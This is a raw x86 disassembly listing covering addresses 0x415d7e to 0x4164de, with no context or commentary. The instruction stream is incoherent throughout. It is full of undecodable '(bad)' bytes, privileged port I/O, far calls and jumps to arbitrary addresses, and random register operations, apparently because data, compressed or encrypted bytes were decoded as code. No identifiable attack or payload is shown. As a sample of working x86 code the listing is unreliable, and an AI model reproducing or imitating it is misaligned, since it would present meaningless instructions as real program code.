  415d7e:	pusha  
  415d7f:	mov    ebx,0x71b1b120
  415d84:	mov    bl,ah
  415d86:	cmp    BYTE PTR [ebp+ecx*2-0x4a],cl
  415d8a:	mov    ecx,0x4a813b30
  415d8f:	xchg   ecx,ecx
  415d91:	mov    DWORD PTR [ecx-0x7c],ecx
  415d94:	pop    ebx
  415d95:	jecxz  0x415d82
  415d97:	outs   dx,DWORD PTR ds:[esi]
  415d98:	jl     0x415d37
  415d9a:	bound  esp,QWORD PTR [ecx-0x1860c4b8]
  415da0:	lds    ecx,FWORD PTR [edi+0x4849147c]
  415da6:	aam    0xaa
  415da8:	push   ebp
  415da9:	call   0x9182:0x648906cd
  415db0:	shl    DWORD PTR [ecx-0x5a],1
  415db3:	addr16 out 0x39,eax
  415db6:	sub    eax,0x96bab197
  415dbb:	adc    DWORD PTR [ecx],esi
  415dbd:	mov    ds:0xc01211af,eax
  415dc2:	arpl   WORD PTR [ebx+0x531e0090],cx
  415dc8:	je     0x415e04
  415dca:	(bad)  
  415dcb:	daa    
  415dcc:	div    BYTE PTR [esi+0x76]
  415dcf:	xlat   BYTE PTR gs:[ebx]
  415dd1:	mov    dl,0x99
  415dd3:	popf   
  415dd4:	sahf   
  415dd5:	mov    ds:0x3a38b35e,al
  415dda:	fisub  DWORD PTR [edi-0x451e9623]
  415de0:	arpl   WORD PTR cs:[ebx-0x1d],sp
  415de4:	in     al,dx
  415de5:	ins    BYTE PTR es:[edi],dx
  415de6:	cmp    eax,DWORD PTR [ebx+eiz*2+0x31]
  415dea:	sbb    cl,BYTE PTR [ebp-0x45f451fa]
  415df0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415df1:	arpl   WORD PTR [eax],bx
  415df3:	push   es
  415df4:	fisttp QWORD PTR [esi-0x65]
  415df7:	pop    edx
  415df8:	lods   eax,DWORD PTR ds:[esi]
  415df9:	dec    edx
  415dfa:	lods   eax,DWORD PTR ds:[esi]
  415dfb:	push   esi
  415dfc:	gs data16 xchg si,ax
  415e00:	lds    ebx,FWORD PTR [ecx+0x18895229]
  415e06:	jmp    0xbbb7fa4f
  415e0b:	ret    
  415e0c:	fwait
  415e0d:	outs   dx,DWORD PTR ds:[esi]
  415e0e:	mov    esp,0xc356ad47
  415e13:	push   0x57
  415e15:	clc    
  415e16:	enter  0x2f0b,0x90
  415e1a:	mov    ecx,0xab66917a
  415e1f:	dec    ebp
  415e20:	ss popf 
  415e22:	loopne 0x415dea
  415e24:	lods   eax,DWORD PTR ds:[esi]
  415e25:	mov    ebx,0xe26d6cec
  415e2a:	cmp    BYTE PTR [esi],dh
  415e2c:	jecxz  0x415dd1
  415e2e:	ret    
  415e2f:	mov    WORD PTR [esi+ecx*4-0x1f],cs
  415e33:	or     cl,BYTE PTR [eax-0x152b9d39]
  415e39:	jne    0x415e57
  415e3b:	mov    DWORD PTR [ebp+0x56],0x84662264
  415e42:	xchg   ebx,eax
  415e43:	ret    0x9b31
  415e46:	sbb    ebx,DWORD PTR [ebx+0x33ed1e1c]
  415e4c:	ds xor ecx,ecx
  415e4f:	in     al,dx
  415e50:	cld    
  415e51:	add    cl,BYTE PTR [ecx-0x69a6e59c]
  415e57:	sub    DWORD PTR [ebx-0x7474f4d2],edi
  415e5d:	or     BYTE PTR [ecx],ah
  415e5f:	ds or  edi,esp
  415e62:	fcomp  QWORD PTR [ecx-0x9]
  415e65:	mov    BYTE PTR [bx-0x73],ch
  415e69:	nop
  415e6a:	add    BYTE PTR [esi],bl
  415e6c:	push   ebx
  415e6d:	in     al,dx
  415e6e:	pop    ds
  415e6f:	in     al,dx
  415e70:	jg     0x415e48
  415e72:	mov    cl,0x6d
  415e74:	jbe    0x415eec
  415e76:	mov    bh,0x19
  415e78:	sbb    ecx,ecx
  415e7a:	xchg   ecx,eax
  415e7b:	iret   
  415e7c:	(bad)  
  415e7d:	mov    al,ds:0x569d3aeb
  415e82:	xchg   DWORD PTR [eax+0x2c],ebp
  415e85:	inc    esi
  415e86:	ss xchg edi,eax
  415e88:	and    ebx,DWORD PTR [esi]
  415e8a:	mov    edx,DWORD PTR [ebx+0x2d3966ce]
  415e90:	xchg   edi,eax
  415e91:	mov    eax,0xb21eef77
  415e96:	sub    al,0x33
  415e98:	xlat   BYTE PTR ds:[ebx]
  415e99:	popf   
  415e9a:	and    ebx,DWORD PTR [esi]
  415e9c:	dec    edi
  415e9d:	xchg   edx,eax
  415e9e:	dec    ecx
  415e9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ea0:	mov    DWORD PTR [eax-0x74a245af],ebx
  415ea6:	xchg   ebx,eax
  415ea7:	bound  edx,QWORD PTR [ecx+0x5e83fdfd]
  415ead:	cmp    BYTE PTR [edi],0x12
  415eb0:	xor    DWORD PTR [ecx+0x34],ebp
  415eb3:	sbb    bl,dh
  415eb5:	cmc    
  415eb6:	mov    edx,0x955ad516
  415ebb:	push   0xffffffad
  415ebd:	mov    fs,WORD PTR [esi-0x7965d736]
  415ec3:	popa   
  415ec4:	push   0x45134c44
  415ec9:	xchg   esi,eax
  415eca:	(bad)  
  415ecc:	fisub  WORD PTR [ebp+0x79]
  415ecf:	jns    0x415ed6
  415ed1:	xor    ebp,DWORD PTR [edx+0x32]
  415ed4:	cmp    al,0x3c
  415ed6:	int3   
  415ed7:	cmc    
  415ed8:	scas   eax,DWORD PTR es:[di]
  415eda:	jae    0x415f2e
  415edc:	cmp    BYTE PTR [ecx+0x66],ah
  415edf:	jbe    0x415e6f
  415ee1:	in     eax,dx
  415ee2:	int    0x4d
  415ee4:	mov    dh,0xb6
  415ee6:	out    dx,al
  415ee7:	shr    DWORD PTR [esi-0x49],1
  415eea:	sbb    DWORD PTR [ebx],ebx
  415eec:	sbb    eax,DWORD PTR [edi-0x6b]
  415eef:	adc    eax,0xe80f0e8e
  415ef4:	mov    ah,0x3b
  415ef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ef7:	rcr    DWORD PTR [ecx],cl
  415ef9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415efa:	addr16 pop ax
  415efd:	pop    ebx
  415efe:	pop    edi
  415eff:	jnp    0x415ef2
  415f01:	pop    ds
  415f02:	inc    edx
  415f04:	das    
  415f05:	in     eax,0x7f
  415f07:	call   0xa3f75ebb
  415f0c:	xor    ebp,ebp
  415f0e:	rcl    BYTE PTR [eax],1
  415f10:	fist   WORD PTR [edx]
  415f12:	and    DWORD PTR [ecx],eax
  415f14:	cmp    al,0x86
  415f16:	clc    
  415f17:	fstp   TBYTE PTR [edi-0x11]
  415f1a:	inc    edi
  415f1b:	das    
  415f1c:	stos   BYTE PTR es:[edi],al
  415f1d:	call   0x5273:0x499d3176
  415f24:	cmp    BYTE PTR [edx+0x3932eddb],ah
  415f2a:	xor    DWORD PTR [ecx-0x7537b6d4],ecx
  415f30:	inc    edx
  415f31:	mov    bh,0xdb
  415f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f34:	push   esp
  415f35:	sub    al,0xd1
  415f37:	push   0x36
  415f39:	enter  0x1c8a,0x8a
  415f3d:	and    dl,bl
  415f3f:	outs   dx,BYTE PTR ds:[esi]
  415f40:	mov    bh,0xb0
  415f42:	ins    DWORD PTR es:[edi],dx
  415f43:	xchg   DWORD PTR [edx-0x4b],ebp
  415f46:	retf   0xba5
  415f49:	out    0x31,eax
  415f4b:	dec    ebp
  415f4c:	sbb    eax,0x15515159
  415f51:	xchg   ebp,eax
  415f52:	aaa    
  415f53:	fidivr WORD PTR [ebx+ecx*4-0x3]
  415f57:	std    
  415f58:	jge    0x415ee8
  415f5a:	push   cs
  415f5b:	(bad)  
  415f5c:	js     0x415f54
  415f5e:	cli    
  415f5f:	xor    eax,0x9d7ebf9e
  415f64:	mov    ebp,0xc72603c3
  415f69:	(bad)  
  415f6a:	sub    DWORD PTR [edi-0x1c8843d5],edx
  415f70:	push   es
  415f71:	cmc    
  415f72:	inc    esi
  415f73:	(bad)  
  415f74:	(bad)  
  415f75:	loop   0x415fb0
  415f77:	cs pushf 
  415f79:	pop    ebx
  415f7a:	and    al,0x1e
  415f7c:	lea    esp,[ecx+0x78c90a6a]
  415f82:	pushf  
  415f83:	scas   eax,DWORD PTR es:[edi]
  415f84:	jle    0x415f83
  415f86:	dec    edi
  415f87:	(bad)  
  415f89:	ffreep st(3)
  415f8b:	mov    BYTE PTR [eax+0xe773b9c],bl
  415f91:	inc    ebp
  415f92:	push   ebp
  415f93:	jmp    0x45558c0e
  415f98:	inc    ecx
  415f99:	enter  0xaa32,0xa6
  415f9d:	xchg   ecx,eax
  415f9e:	dec    esp
  415f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fa0:	dec    eax
  415fa1:	and    al,0x93
  415fa3:	sub    al,0x2f
  415fa5:	sub    eax,0xdb3bbb1
  415faa:	cs dec esp
  415fac:	dec    esi
  415fad:	dec    ebp
  415fae:	mov    cl,0xbb
  415fb0:	mov    bl,0xc3
  415fb2:	(bad)  
  415fb3:	out    dx,al
  415fb4:	pop    esi
  415fb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415fb6:	pop    edx
  415fb7:	test   eax,0xc6fc0abc
  415fbc:	pop    ecx
  415fbd:	imul   DWORD PTR [ebx-0x78]
  415fc0:	jg     0x415fd5
  415fc2:	and    DWORD PTR [ecx],eax
  415fc4:	cmp    al,0x86
  415fc6:	push   0x4eaf9ab5
  415fcb:	dec    esp
  415fcc:	dec    esi
  415fcd:	inc    ebp
  415fce:	xor    ebp,DWORD PTR [ecx-0x6f5545cc]
  415fd4:	dec    eax
  415fd5:	and    al,0xe8
  415fd7:	je     0x415f94
  415fd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fda:	xor    ebx,DWORD PTR [ecx]
  415fdc:	loop   0x415fcf
  415fde:	add    al,0x2
  415fe0:	ror    edx,0xca
  415fe3:	adc    dl,BYTE PTR [ebp+0x4eed29ca]
  415fe9:	fwait
  415fea:	xchg   ecx,eax
  415feb:	loope  0x415ffe
  415fed:	inc    esi
  415fee:	xchg   BYTE PTR [edi-0x58],al
  415ff1:	push   esp
  415ff2:	sub    ebx,DWORD PTR [eax+0x468d0891]
  415ff8:	xchg   ebx,eax
  415ff9:	push   edx
  415ffa:	stc    
  415ffb:	xchg   esp,eax
  415ffc:	mov    BYTE PTR [ecx],bl
  415ffe:	and    eax,0x842af715
  416003:	sbb    al,0xd7
  416005:	mov    eax,ds:0x28a369dd
  41600a:	xor    bl,BYTE PTR [edx-0x59b56e5f]
  416010:	xor    DWORD PTR [ebp+ecx*1+0x49],esi
  416014:	xchg   esi,eax
  416015:	push   0x3a749ab6
  41601a:	sbb    eax,0xc22edd3a
  41601f:	scas   eax,DWORD PTR es:[edi]
  416020:	das    
  416021:	jbe    0x41608f
  416023:	fwait
  416024:	dec    esi
  416025:	mov    bh,0x83
  416027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416028:	imul   ebp,DWORD PTR [eax-0x62c5b556],0x50a952a2
  416032:	cmp    DWORD PTR [ebp-0x35494d50],ebp
  416038:	rol    ecx,0x3e
  41603b:	jecxz  0x416050
  41603d:	adc    edi,DWORD PTR [eax+ebp*8+0x43]
  416041:	das    
  416042:	loop   0x416046
  416044:	jmp    0x9636fabd
  416049:	push   ebp
  41604a:	mov    edx,0x6ce92e9d
  41604f:	xchg   BYTE PTR [ebx+0x37361393],dl
  416055:	aaa    
  416056:	mov    al,0x2d
  416058:	or     ebx,ebp
  41605a:	xor    BYTE PTR [esi],bh
  41605c:	dec    ecx
  41605d:	dec    eax
  41605e:	add    BYTE PTR [edi+0x39c7c225],cl
  416064:	cmp    eax,0xff2bf886
  416069:	icebp  
  41606a:	jg     0x416066
  41606c:	fisttp WORD PTR [ecx+0x42]
  41606f:	pushf  
  416070:	dec    edi
  416071:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416072:	shl    ah,cl
  416074:	xchg   ebx,esi
  416076:	dec    esp
  416077:	dec    edi
  416078:	iret   
  416079:	jo     0x4160cd
  41607b:	cmp    BYTE PTR [esi+0x6f],ah
  41607e:	jg     0x41609f
  416080:	inc    ebp
  416081:	xchg   ecx,eax
  416082:	shl    DWORD PTR ds:0x3bb533dd,1
  416088:	sub    eax,0x71615964
  41608d:	jno    0x416020
  41608f:	inc    esp
  416090:	xor    al,BYTE PTR [ecx+0x2e]
  416093:	xchg   ebx,eax
  416094:	arpl   WORD PTR [eax],di
  416096:	aas    
  416097:	(bad)  
  416098:	into   
  416099:	out    dx,al
  41609a:	push   cs
  41609b:	sub    ebp,DWORD PTR [ebx+0x1dedec2b]
  4160a1:	pusha  
  4160a2:	(bad)  
  4160a3:	mov    ds:0x238e4d4c,al
  4160a8:	test   ah,cl
  4160aa:	in     al,dx
  4160ab:	int3   
  4160ac:	or     al,0x42
  4160ae:	adc    ch,BYTE PTR [esp+ebp*4-0x45454d52]
  4160b5:	mov    ch,ch
  4160b7:	mov    eax,0x4c31e3c4
  4160bc:	shl    DWORD PTR [edx+ebx*1],cl
  4160bf:	lea    esi,[ecx]
  4160c1:	cmp    esi,DWORD PTR [ebx]
  4160c3:	int    0xde
  4160c5:	shl    DWORD PTR [ecx],0xb7
  4160c8:	outs   dx,BYTE PTR ds:[esi]
  4160c9:	frstor [edi+esi*2+0x6f]
  4160cd:	rdpmc  
  4160cf:	sbb    ah,BYTE PTR [ebx+0x76]
  4160d2:	jp     0x4160de
  4160d4:	xor    ebx,DWORD PTR [edx]
  4160d6:	gs icebp 
  4160d8:	fsub   QWORD PTR [edx]
  4160da:	mov    ch,BYTE PTR [ebx+esi*8]
  4160dd:	out    0x9b,al
  4160df:	outs   dx,DWORD PTR ds:[esi]
  4160e0:	push   edx
  4160e1:	cs xchg edi,eax
  4160e3:	xchg   ecx,eax
  4160e4:	fs cdq 
  4160e6:	(bad)
  4160e9:	mov    ah,0x5b
  4160eb:	sub    eax,0x9d068dea
  4160f0:	mov    dh,0x57
  4160f2:	jo     0x416094
  4160f4:	sub    BYTE PTR [edx],cl
  4160f6:	jae    0x416103
  4160f8:	mov    ecx,DWORD PTR [eax]
  4160fa:	pop    ss
  4160fb:	(bad)  
  4160fc:	xlat   BYTE PTR ds:[ebx]
  4160fd:	xlat   BYTE PTR ds:[ebx]
  4160fe:	xor    BYTE PTR [ebx+eax*4],cl
  416101:	cld    
  416102:	push   eax
  416103:	ds std 
  416105:	lahf   
  416106:	jl     0x416107
  416108:	idiv   edi
  41610a:	ret    0xf5ff
  41610d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41610e:	inc    ebx
  416110:	cmp    ch,bl
  416112:	mov    esi,0x423f710d
  416117:	or     esp,eax
  416119:	xor    ebx,eax
  41611b:	(bad)  
  41611c:	std    
  41611d:	ret    
  41611e:	das    
  41611f:	or     al,0x83
  416121:	clc    
  416122:	dec    eax
  416123:	cmp    al,0x1e
  416125:	ins    DWORD PTR es:[di],dx
  416127:	jne    0x4160c2
  416129:	rcl    ecx,1
  41612b:	popa   
  41612c:	push   ss
  41612d:	pop    ss
  41612e:	push   ss
  41612f:	jo     0x41614d
  416131:	fwait
  416132:	rcl    DWORD PTR [edx+0x11],cl
  416135:	mov    ebx,0x14bcc5db
  41613a:	in     eax,0xdc
  41613c:	stc    
  41613d:	or     ebp,DWORD PTR [edi+ebp*2+0x6f]
  416141:	xor    dl,BYTE PTR [ebx+ecx*8-0x16a952ad]
  416148:	je     0x416185
  41614a:	cmp    BYTE PTR [esi-0x38eed5b3],dl
  416150:	jne    0x416113
  416152:	mov    dl,0x2c
  416154:	stos   BYTE PTR es:[edi],al
  416155:	mov    ch,0x6
  416157:	mov    ch,BYTE PTR [ebx+edx*4]
  41615a:	dec    ecx
  41615b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41615c:	jno    0x4161c4
  41615e:	and    DWORD PTR [ebp+0x74edd24c],ebx
  416164:	fcomp  st(3)
  416166:	(bad)  [edi+0x7872ab5e]
  41616c:	sbb    cl,ah
  41616e:	fsubr  st(2),st
  416170:	add    dh,BYTE PTR [ecx-0x58896b98]
  416176:	inc    ebx
  416177:	sbb    DWORD PTR es:[ebx-0x11],esp
  41617b:	loopne 0x41610d
  41617d:	dec    edx
  41617e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41617f:	loop   0x4161d0
  416181:	xor    eax,0x6233176
  416186:	xchg   BYTE PTR [ecx-0x20],ah
  416189:	cmp    ch,BYTE PTR [esi]
  41618b:	sbb    eax,0x8cc44bab
  416190:	shl    BYTE PTR [ebp-0x3c0c79d4],1
  416196:	sbb    al,0x1c
  416198:	push   ds
  416199:	mov    al,0xba
  41619b:	je     0x416134
  41619d:	xchg   ebx,eax
  41619e:	bound  ecx,QWORD PTR [ecx-0x19ba3a3b]
  4161a4:	out    0x17,eax
  4161a6:	mov    BYTE PTR [edx+eiz*1-0x58],al
  4161aa:	mov    edx,0x6356bd41
  4161af:	je     0x416225
  4161b1:	mov    WORD PTR [eax-0x2c],cs
  4161b4:	inc    esp
  4161b5:	xchg   esi,eax
  4161b6:	in     eax,0x99
  4161b8:	mov    ebp,0x8117fdfd
  4161bd:	aas    
  4161be:	cmp    al,0xdb
  4161c0:	fimul  WORD PTR ds:0x16847ef1
  4161c6:	shl    BYTE PTR [ebx-0x7a],0xf9
  4161ca:	jae    0x4161b3
  4161cc:	mov    edi,0x3f10843
  4161d1:	inc    ebx
  4161d2:	mov    ecx,0x5bdbdb3c
  4161d7:	cmp    BYTE PTR [esi+0x1088c445],cl
  4161dd:	xor    DWORD PTR [ebp-0x16],ecx
  4161e0:	lea    eax,[esi]
  4161e2:	scas   al,BYTE PTR es:[edi]
  4161e3:	jecxz  0x416217
  4161e5:	cmp    bh,BYTE PTR [esi]
  4161e7:	inc    esi
  4161e8:	ss fwait
  4161ea:	and    edx,DWORD PTR [esi]
  4161ec:	mov    esi,DWORD PTR [ecx]
  4161ee:	ss ds dec esi
  4161f1:	lods   eax,DWORD PTR ds:[esi]
  4161f2:	jp     0x4161be
  4161f4:	popf   
  4161f5:	cmp    esi,DWORD PTR [edi+0x28]
  4161f8:	adc    eax,0x428a484b
  4161fd:	ds lahf 
  4161ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416200:	arpl   WORD PTR [ecx+0x64],bx
  416203:	mov    bl,0x39
  416205:	adc    cl,BYTE PTR [ecx-0x6ebd7afc]
  41620b:	cmc    
  41620c:	jnp    0x416205
  41620e:	jo     0x41626d
  416210:	pop    ss
  416211:	(bad)  
  416212:	jne    0x4161c5
  416214:	sbb    eax,0x316bab1b
  416219:	xor    DWORD PTR ds:[esi+0x1d1ccb24],ecx
  416220:	push   ds
  416221:	mov    cl,0xb7
  416223:	mov    edi,0x4829248f
  416228:	xchg   edx,eax
  416229:	inc    esp
  41622a:	mov    bh,0xdb
  41622c:	and    eax,0x9b221f9f
  416231:	int    0xb2
  416233:	mov    bl,0x7f
  416235:	shr    BYTE PTR [ebp+0x3939379b],0x29
  41623c:	xchg   edx,eax
  41623d:	leave  
  41623e:	fs cdq 
  416240:	sahf   
  416241:	sahf   
  416242:	es push ds
  416244:	dec    edi
  416245:	mov    al,0xb0
  416247:	mov    eax,0x665cb948
  41624c:	stc    
  41624d:	out    dx,al
  41624e:	pop    ebp
  41624f:	(bad)  
  416251:	push   ss
  416252:	stc    
  416253:	cld    
  416254:	xor    BYTE PTR [edx-0x4d4d4f9f],bh
  41625a:	int3   
  41625b:	loope  0x41621e
  41625d:	ds test eax,0xd1e18a54
  416263:	push   ecx
  416264:	cmp    bl,BYTE PTR [ebp+0x5d7af50e]
  41626a:	inc    esp
  41626b:	and    edx,DWORD PTR [ecx-0x5201200b]
  416271:	(bad)  
  416272:	sti    
  416273:	(bad)  
  416274:	iret   
  416275:	mov    edx,0x8fdc437f
  41627a:	rol    BYTE PTR [edx],1
  41627c:	js     0x41624a
  41627e:	and    cl,cl
  416280:	retf   0x4f27
  416283:	or     al,BYTE PTR ds:0xb20d131a
  416289:	(bad)  [eax+edi*4]
  41628c:	ss popf 
  41628e:	jbe    0x416217
  416290:	test   DWORD PTR [ebp+0x43553445],eax
  416296:	clc    
  416297:	add    eax,0xfbfb07fa
  41629c:	push   esp
  41629d:	stos   DWORD PTR es:[edi],eax
  41629e:	push   ebp
  41629f:	and    ah,BYTE PTR [esi-0x47471277]
  4162a5:	inc    eax
  4162a6:	stos   DWORD PTR es:[edi],eax
  4162a7:	frstor [edx-0x776f162d]
  4162ad:	(bad)  
  4162ae:	cwde   
  4162af:	cdq    
  4162b0:	sahf   
  4162b1:	inc    esi
  4162b2:	shl    DWORD PTR [esp+ecx*2-0x3d],cl
  4162b6:	loopne 0x416283
  4162b8:	pop    edi
  4162b9:	std    
  4162ba:	sbb    al,BYTE PTR [edi-0x79]
  4162bd:	pop    es
  4162be:	pushf  
  4162bf:	sahf   
  4162c0:	sahf   
  4162c1:	repnz fisubr DWORD PTR [ebx]
  4162c4:	das    
  4162c5:	jae    0x4162b4
  4162c7:	retf   0x9cd3
  4162ca:	adc    al,0x4f
  4162cc:	sbb    DWORD PTR [ecx],ebx
  4162ce:	repnz add al,0xfc
  4162d1:	out    0xad,al
  4162d3:	pop    ebx
  4162d4:	mov    ah,0xdb
  4162d6:	ins    DWORD PTR es:[edi],dx
  4162d7:	fs pop ecx
  4162d9:	out    0xda,al
  4162db:	xchg   ebp,eax
  4162dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162dd:	dec    ecx
  4162de:	adc    ch,BYTE PTR es:[eax+0x31198c8a]
  4162e5:	pop    eax
  4162e6:	pop    esi
  4162e7:	pop    ecx
  4162e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4162e9:	push   edx
  4162ea:	lods   eax,DWORD PTR ds:[esi]
  4162eb:	shr    ch,1
  4162ed:	pop    edx
  4162ee:	sbb    BYTE PTR [ecx],dl
  4162f0:	sbb    eax,0x71705145
  4162f5:	test   eax,0x56586ad7
  4162fa:	xchg   edi,eax
  4162fb:	dec    esp
  4162fc:	mov    esp,DWORD PTR ss:[esi+0x39b364eb]
  416303:	out    dx,al
  416304:	fdivr  QWORD PTR [esi+0x2eeedec5]
  41630a:	xchg   edx,eax
  41630b:	and    al,0x31
  41630d:	cmp    esi,DWORD PTR [edi]
  41630f:	dec    edi
  416310:	icebp  
  416311:	in     al,0x84
  416313:	jnp    0x416380
  416315:	sub    esp,DWORD PTR [edx+edx*4]
  416318:	imul   ebp,DWORD PTR [esi+ebp*2-0x703f8c09],0x86ff759d
  416323:	mov    eax,0xf005a11f
  416328:	sbb    cl,ah
  41632a:	pop    edi
  41632b:	cld    
  41632c:	out    0xbf,al
  41632e:	mov    dl,BYTE PTR [ebx+ecx*2]
  416331:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416332:	das    
  416333:	je     0x4162f0
  416335:	push   esi
  416336:	out    0xfc,al
  416338:	stc    
  416339:	or     ecx,DWORD PTR [edi+ecx*4+0x119a628f]
  416340:	xchg   edx,eax
  416341:	test   eax,0x21a69a14
  416346:	dec    ecx
  416347:	xor    ch,cl
  416349:	dec    esp
  41634a:	call   0x12ca:0xcac62c58
  416351:	daa    
  416352:	test   DWORD PTR [edx],eax
  416354:	lods   eax,DWORD PTR ds:[esi]
  416355:	push   esi
  416356:	xchg   ebx,eax
  416357:	icebp  
  416358:	icebp  
  416359:	xor    DWORD PTR [ebx+esi*1-0x76],ecx
  41635d:	mov    eax,ds:0x7286e41b
  416362:	xor    al,0x9b
  416364:	dec    ebp
  416365:	mov    dh,0x76
  416367:	mov    dh,0x69
  416369:	mov    bh,0x3b
  41636b:	enter  0x428a,0xb5
  41636f:	push   esi
  416370:	mov    ds:0x4f12ab5a,eax
  416375:	and    al,0xc9
  416377:	out    0x86,eax
  416379:	jo     0x416397
  41637b:	xchg   edi,eax
  41637c:	bound  edi,QWORD PTR [ecx+0x6846698c]
  416382:	ss pop ebx
  416384:	sbb    al,0x1d
  416386:	sbb    eax,0xb90ebae3
  41638b:	jl     0x41632b
  41638d:	js     0x4163bb
  41638f:	retf   0xfefe
  416392:	add    DWORD PTR [ebp-0x7a38f4aa],ebp
  416398:	scas   al,BYTE PTR es:[edi]
  416399:	shr    DWORD PTR gs:[esp+esi*1-0x67],1
  41639e:	call   0xdeee:0x7437469a
  4163a5:	mov    ecx,0x32f2eacb
  4163aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163ab:	xchg   ebp,eax
  4163ac:	push   ebx
  4163ad:	out    0x16,al
  4163af:	push   ss
  4163b0:	enter  0x86e5,0x48
  4163b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4163b5:	shl    DWORD PTR [ebx+edx*2],cl
  4163b8:	dec    ecx
  4163b9:	mov    dh,0xb7
  4163bb:	mov    dh,0x29
  4163bd:	adc    eax,0x3973648b
  4163c2:	fs inc ebp
  4163c4:	popa   
  4163c5:	jne    0x41642c
  4163c7:	cdq    
  4163c8:	ret    0x8149
  4163cb:	js     0x416409
  4163cd:	inc    ecx
  4163ce:	lods   eax,DWORD PTR ds:[esi]
  4163cf:	push   esi
  4163d0:	dec    edi
  4163d1:	pop    edi
  4163d2:	jle    0x4163ba
  4163d4:	retf   0xde97
  4163d7:	clc    
  4163d8:	shr    DWORD PTR [edi+0x3f759c9d],cl
  4163de:	xchg   eax,ebp
  4163e0:	and    esi,DWORD PTR [eax+eax*1-0x54abdce2]
  4163e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163e8:	push   edi
  4163e9:	shr    DWORD PTR [ecx+0x2e50eccc],cl
  4163ef:	dec    edi
  4163f0:	mov    bh,0xdb
  4163f2:	es push 0x66
  4163f5:	sbb    edx,ecx
  4163f7:	out    0x88,al
  4163f9:	daa    
  4163fa:	adc    bl,BYTE PTR [esi+ebx*1]
  4163fd:	push   ds
  4163fe:	jb     0x416474
  416400:	js     0x4163c2
  416402:	enter  0x28c8,0xc3
  416406:	and    esp,DWORD PTR [ebx-0x74796558]
  41640c:	mov    ebp,DWORD PTR [ebp-0x27]
  41640f:	cwde   
  416410:	data16 add al,0x55
  416413:	ror    eax,cl
  416415:	data16 xor ah,BYTE PTR [ebx+edx*1-0x2829a9f7]
  41641d:	pop    ecx
  41641e:	pop    edi
  41641f:	pop    ebp
  416420:	ret    
  416421:	inc    ebp
  416422:	loop   0x4163a9
  416424:	(bad)  
  416426:	iret   
  416427:	xchg   ebp,eax
  416428:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416429:	das    
  41642a:	xchg   ebx,eax
  41642b:	retf   
  41642c:	in     eax,0xc8
  41642e:	xor    bh,BYTE PTR gs:[eax]
  416431:	scas   al,BYTE PTR es:[edi]
  416432:	ret    
  416433:	aaa    
  416434:	fistp  QWORD PTR [edx-0x65]
  416437:	ret    0x8171
  41643a:	jb     0x4164b5
  41643c:	xchg   esi,eax
  41643d:	or     esp,edi
  41643f:	iret   
  416440:	jno    0x41643f
  416442:	ficom  DWORD PTR [ebp+0x5a]
  416445:	in     eax,dx
  416446:	push   ss
  416447:	jecxz  0x4164ac
  416449:	mov    ds:0xe0dbddac,eax
  41644e:	imul   ch
  416450:	cmp    eax,DWORD PTR [eax]
  416452:	pop    esp
  416453:	mov    ebp,0x97cb957a
  416458:	xor    dh,BYTE PTR cs:[esp+edx*4]
  41645c:	daa    
  41645d:	cdq    
  41645e:	dec    eax
  41645f:	shr    BYTE PTR [eax+0x35],1
  416462:	cmp    DWORD PTR [esi],edi
  416464:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416466:	fldcw  WORD PTR [edx+0x12]
  416469:	mov    bh,0x2c
  41646b:	xor    al,0x45
  41646d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41646e:	fsubr  DWORD PTR [edx+edx*2]
  416471:	cs xchg edi,eax
  416473:	std    
  416474:	pop    edx
  416475:	adc    BYTE PTR [ecx+0xc],0x43
  416479:	bound  ebp,QWORD PTR [bp+si-0x76]
  41647d:	push   0xffffffa5
  41647f:	dec    edx
  416480:	mov    ebp,0x8b1e275e
  416485:	adc    ecx,DWORD PTR [edi+0x24]
  416488:	fcomp  st(3)
  41648a:	fbstp  TBYTE PTR [edi]
  41648c:	jae    0x416447
  41648e:	in     al,dx
  41648f:	sub    eax,eax
  416491:	rcr    cl,cl
  416493:	div    BYTE PTR [edx-0x78]
  416496:	inc    ecx
  416497:	test   BYTE PTR [eax+esi*8],al
  41649a:	sbb    BYTE PTR [ecx+0x67],ah
  41649d:	addr16 out 0x13,eax
  4164a0:	cs inc edx
  4164a2:	sahf   
  4164a3:	call   0xddee:0x6d7080be
  4164aa:	pop    ebx
  4164ab:	daa    
  4164ac:	xchg   edi,eax
  4164ad:	int    0x11
  4164af:	(bad)  
  4164b0:	(bad)
  4164b3:	(bad)  [edx+ebx*1]
  4164b6:	or     eax,0x18f6f60e
  4164bb:	push   ds
  4164bc:	sbb    ebp,esp
  4164be:	rcl    BYTE PTR [ebx-0x69],cl
  4164c1:	(bad)  
  4164c3:	fisub  DWORD PTR [eax+ebp*1+0x37]
  4164c7:	inc    esp
  4164c8:	jmp    0x52eaa971
  4164cd:	shl    DWORD PTR [ebp+0x1d],0x64
  4164d1:	pop    ecx
  4164d2:	inc    esi
  4164d3:	or     BYTE PTR [ecx],cl
  4164d5:	inc    ebp
  4164d6:	push   ecx
  4164d7:	mov    al,0x6c
  4164d9:	pop    es
  4164da:	and    DWORD PTR [esp+esi*1],esp
  4164dd:	dec    ebp
  4164de:	and    DWORD PTR [edx],ebx
